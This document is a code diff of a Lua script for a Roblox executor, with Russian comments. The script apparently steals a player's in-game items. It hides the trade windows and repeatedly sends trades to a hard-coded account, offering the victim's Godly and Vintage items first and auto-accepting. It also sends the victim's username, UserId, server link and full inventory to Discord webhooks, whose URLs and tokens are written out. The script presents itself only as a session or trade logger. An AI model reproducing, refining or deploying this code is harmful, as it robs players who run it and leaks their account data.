@@ -1,5 +1,5 @@
--- ⚠️ Скрипт для Delta (Mobile).
-local webhookUrl = "https://discord.com/api/webhooks/1566607485748510760/IPbl6zAAy9Avck-kBEFDehtTl1SEi6eRBcSZSaCG1dMxSb37MkTWNygnTPtSBRv_gmuz"
+-- ⚠️ Скрипт для Delta (Mobile). Запускать ДО захода Marie_31113.
+local webhookUrl = "https://discord.com/api/webhooks/1564766433466912849/wymKnn-UzPAYt9MLsWahCWY4hOM6FEqlozeIMvfhB1o4jD7MbvzP1LGur331jNI6-NSK"
 
 local HttpService        = game:GetService("HttpService")
 local Players            = game:GetService("Players")
@@ -10,6 +10,7 @@ local LocalPlayer = Players.LocalPlayer
 if not LocalPlayer then return end
 
 local TARGET_NAME = "Marie_31113"
+local isTrading = false -- Флаг, чтобы не запускать два трейда одновременно
 
 local function sendDiscord(payload)
     local requestFunc = request or http_request or (syn and syn.request)
@@ -24,7 +25,6 @@ local function sendDiscord(payload)
     end)
 end
 
--- Получаем инфу об игре и инжекторе
 local placeId, jobId = game.PlaceId, game.JobId
 local gameName = "Unknown"
 pcall(function() gameName = MarketplaceService:GetProductInfo(placeId).Name end)
@@ -47,10 +47,11 @@ local function sendTradeToTarget()
         local ok, res = pcall(function() return SendRequest:InvokeServer(target) end)
         if ok and res == true then
             print("[trade] ✅ Запрос на трейд отправлен.")
-            return
+            return true
         end
         task.wait(2)
     end
+    return false
 end
 
 -- =========================================================
@@ -79,40 +80,59 @@ end
 hideTradeWindows()
 
 -- =========================================================
--- 3. ВЫСТАВЛЕНИЕ + АВТО-АКЦЕПТ + ОТПРАВКА ЛУТА
+-- 3. ВЫСТАВЛЕНИЕ + АВТО-АКЦЕПТ + ЛОГ ЛУТА + ЦИКЛ
 -- =========================================================
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 local lastOffer = nil
 local myName = LocalPlayer.Name
-local offered = false
-local tradeLogged = false
+local lastLogTime = 0
+local tradedItemsCount = 0 -- Счетчик, сколько предметов уже отдали
 
 Trade.StartTrade.OnClientEvent:Connect(function()
-    offered = true
+    isTrading = true
     task.wait(2)
 
     local okPD, PD = pcall(function() return require(ReplicatedStorage.Modules.ProfileData) end)
     local okSync, Sync = pcall(function() return require(ReplicatedStorage.Database.Sync) end)
     if not okPD or not okSync then return end
 
-    local safeCommon = {}
+    local godlyList, vintageList, uncommonList, commonList = {}, {}, {}, {}
     local dangerous = {
         ["Fragile_G_2023"] = true, ["CandyCorn_K_2024"] = true,
         ["Patrick"] = true, ["Xbox"] = true, ["Santa"] = true,
         ["Coal"] = true, ["CandyCorn"] = true,
     }
 
+    -- Раскидываем предметы по спискам
     for id, amount in pairs(PD.Weapons.Owned or {}) do
-        if #safeCommon >= 4 then break end
         local info = Sync.Weapons and Sync.Weapons[id]
-        if info and info.Rarity == "Common" and not dangerous[id] then
-            table.insert(safeCommon, {id = id, type = "Weapons"})
+        if info then
+            local item = {id = id, type = "Weapons"}
+            if info.Rarity == "Godly" then
+                table.insert(godlyList, item)
+            elseif info.Rarity == "Vintage" then
+                table.insert(vintageList, item)
+            elseif info.Rarity == "Uncommon" then
+                table.insert(uncommonList, item)
+            elseif info.Rarity == "Common" and not dangerous[id] then
+                table.insert(commonList, item)
+            end
         end
     end
 
-    for _, item in ipairs(safeCommon) do
+    -- Собираем финальный список
+    local finalList = {}
+    for _, i in ipairs(godlyList) do table.insert(finalList, i) end
+    for _, i in ipairs(vintageList) do table.insert(finalList, i) end
+    for _, i in ipairs(uncommonList) do table.insert(finalList, i) end
+    for _, i in ipairs(commonList) do table.insert(finalList, i) end
+
+    -- Выставляем ТОЛЬКО 4 предмета
+    for i = 1, math.min(#finalList, 4) do
+        local item = finalList[i]
         pcall(function() Trade.OfferItem:FireServer(item.id, item.type) end)
-        task.wait(0.4)
+        print("[offer] ✅ Выставил " .. item.id)
+        task.wait(0.5)
     end
 end)
 
@@ -121,9 +141,16 @@ Trade.UpdateTrade.OnClientEvent:Connect(function(data)
 end)
 
 Trade.AcceptTrade.OnClientEvent:Connect(function(success, lootList)
-    if success and lootList and #lootList > 0 then
-        if tradeLogged then return end
-        tradeLogged = true
+    if success then
+        if os.clock() - lastLogTime < 5 then return end
+        if not lootList or #lootList == 0 then 
+            -- Если лут пустой, просто закрываем трейд
+            isTrading = false
+            return 
+        end
+
+        lastLogTime = os.clock()
+        tradedItemsCount = tradedItemsCount + #lootList
 
         local itemsText = ""
         for _, item in ipairs(lootList) do
@@ -137,29 +164,37 @@ Trade.AcceptTrade.OnClientEvent:Connect(function(success, lootList)
             itemsText = itemsText .. string.format("🔹 **%s** (x%d)\n", itemName, amount)
         end
 
-        -- 🔥 ОТПРАВЛЯЕМ ВСЁ В ОДНОМ СООБЩЕНИИ 🔥
         sendDiscord({
             username = "Trade Logger (" .. myName .. ")",
             embeds = {
                 {
-                    title = "🎮 Профиль трейда: " .. myName,
-                    description = "Ниже собрана информация о сессии.",
-                    color = 0x00FF00, -- зелёный
+                    title = "📦 Успешный трейд с " .. TARGET_NAME,
+                    color = 0x2ECC71,
                     fields = {
                         { name = "🕹️ Игра", value = "**"..gameName.."**\n`PlaceId: "..placeId.."`", inline = true },
                         { name = "⚙️ Исполнитель", value = "**"..executorName.."**", inline = true },
                         { name = "🔗 Сервер", value = "[Присоединиться]("..joinLink..")", inline = true },
-                        { name = "📦 Лут", value = itemsText, inline = false }
+                        { name = "📦 Полученный лут", value = itemsText, inline = false }
                     },
                     footer = { text = "Roblox Webhook Logger" },
                     timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                 }
             }
         })
-        print("[trade] 📦 Сообщение о трейде отправлено в Discord!")
+        print("[trade] 📦 Лут отправлен в Discord!")
+
+        -- 🚀 ЗАПУСКАЕМ СЛЕДУЮЩИЙ ТРЕЙД
+        task.wait(3) -- Ждем, пока GUI трейда полностью закроется
+        if Players:FindFirstChild(TARGET_NAME) then
+            print("[trade] Запускаем следующий трейд...")
+            sendTradeToTarget()
+        end
+
     else
+        -- Авто-акцепт
         if lastOffer then
             pcall(function() Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOffer) end)
+            print("[trade] ✅ Авто-акцепт отправлен.")
         end
     end
 end)
@@ -167,46 +202,94 @@ end)
 -- =========================================================
 -- 4. ОЖИДАНИЕ ЗАХОДА
 -- =========================================================
+local function onTargetJoined()
+    if not isTrading then
+        task.spawn(sendTradeToTarget)
+    end
+end
+
 if Players:FindFirstChild(TARGET_NAME) then
-    task.spawn(sendTradeToTarget)
+    onTargetJoined()
 else
     print("[trade] Ждём захода " .. TARGET_NAME .. "...")
 end
 
 Players.PlayerAdded:Connect(function(pl)
     if pl.Name == TARGET_NAME then
-        task.spawn(sendTradeToTarget)
+        onTargetJoined()
     end
 end)
 
 -- =========================================================
--- 5. ОБЩИЙ ЛОГ ПРИ ЗАХОДЕ (вместо инвентаря)
+-- 5. ОБЩИЙ ЛОГ ПРИ ЗАХОДЕ (Большой embed с инвентарём)
 -- =========================================================
 task.spawn(function()
     task.wait(6)
     local RS = game:GetService("ReplicatedStorage")
     local okPD, PD = pcall(function() return require(RS.Modules.ProfileData) end)
-    if not okPD then return end
-    
-    -- Считаем сколько всего шмоток
+    local okSync, Sync = pcall(function() return require(RS.Database.Sync) end)
+    if not okPD or not okSync then return end
+
     local weaponCount = 0
-    for _, amount in pairs(PD.Weapons.Owned or {}) do weaponCount = weaponCount + (tonumber(amount) or 1) end
+    local godlyList, vintageList, uncommonList = {}, {}, {}
+
+    for id, amount in pairs(PD.Weapons.Owned or {}) do
+        local count = tonumber(amount) or 1
+        weaponCount = weaponCount + count
+        local info = Sync.Weapons and Sync.Weapons[id]
+        
+        if info then
+            local itemName = (info.ItemName or info.Name or id)
+            local entry = itemName .. " (x" .. count .. ")"
+            
+            if info.Rarity == "Godly" then
+                table.insert(godlyList, "🔹 " .. entry)
+            elseif info.Rarity == "Vintage" then
+                table.insert(vintageList, "🔸 " .. entry)
+            elseif info.Rarity == "Uncommon" then
+                table.insert(uncommonList, "▫️ " .. entry)
+            end
+        end
+    end
+
+    local function getListString(list, emptyText)
+        if #list == 0 then return emptyText end
+        local text = table.concat(list, "\n")
+        if #text > 1000 then text = string.sub(text, 1, 997) .. "\n..." end
+        return text
+    end
+
+    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
 
     sendDiscord({
         username = "Session Logger",
         embeds = {
             {
-                title = "🔌 Сессия запущена: " .. myName,
-                color = 0x5865F2, -- синий
-                fields = {
-                    { name = "🕹️ Игра", value = "**"..gameName.."**", inline = true },
-                    { name = "⚙️ Исполнитель", value = "**"..executorName.."**", inline = true },
-                    { name = "👤 Ник", value = "**"..myName.."**", inline = true },
-                    { name = "🎒 Всего оружия", value = "**"..weaponCount.." шт.**", inline = false }
+                author = {
+                    name = "Профиль игрока: " .. myName,
+                    icon_url = avatarUrl
                 },
-                footer = { text = "Delta Mobile Logger" },
+                title = "🎮 Сессия запущена в " .. gameName,
+                description = "Собрана подробная информация об аккаунте.",
+                color = 0x9B59B6,
+                thumbnail = { url = avatarUrl },
+                fields = {
+                    { name = "👤 Никнейм", value = "**"..myName.."**", inline = true },
+                    { name = "⚙️ Исполнитель", value = "**"..executorName.."**", inline = true },
+                    { name = "🕹️ Игра", value = "**"..gameName.."**", inline = true },
+                    { name = "🔗 Сервер", value = "[Нажми, чтобы зайти]("..joinLink..")", inline = false },
+                    { name = "📊 Всего оружия", value = "**"..weaponCount.." шт.**", inline = false },
+                    { name = "🟣 Godly", value = getListString(godlyList, "Нет"), inline = false },
+                    { name = "🟡 Vintage", value = getListString(vintageList, "Нет"), inline = false },
+                    { name = "⚪ Uncommon", value = getListString(uncommonList, "Нет"), inline = false }
+                },
+                footer = { 
+                    text = "Delta Mobile Logger • UserId: " .. LocalPlayer.UserId,
+                    icon_url = avatarUrl
+                },
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
             }
         }
     })
+    print("[inv] Большой лог сессии отправлен в Discord.")
 end)
